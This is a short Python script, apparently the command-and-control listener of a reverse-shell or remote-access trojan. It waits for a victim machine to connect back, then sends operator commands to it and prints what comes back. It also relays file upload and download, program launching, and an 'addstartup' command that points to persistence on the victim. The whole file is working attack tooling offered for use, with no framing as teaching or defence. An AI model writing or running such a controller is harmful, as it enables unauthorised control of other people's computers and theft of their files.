# Script Made By 17mj
# -------------------
import socket
import os
import configparser

config = configparser.ConfigParser()
config.read('config.ini')

HOST = config['DATABASE']['lhost']
PORT = int(config['DATABASE']['lport'])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))

def startListener():
    s.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    client_socket, client_address = s.accept()
    print(f"[+] Connection from {client_address}")

    while True:
        command = input(f"{client_address} >>> ")
        
        if command.lower() == 'exit':
            client_socket.send('exit'.encode())
            break

        elif command.startswith('start '):
            client_socket.send(command.encode())
            continue

        elif command.lower().startswith('upload ') or command.lower().startswith('download ') or command.lower() == 'addstartup':
            client_socket.send(command.encode())
            continue

        client_socket.send(command.encode())
        result = client_socket.recv(4096).decode()
        print('')
        print(result)
        print('')

    client_socket.close()
    s.close()

startListener()
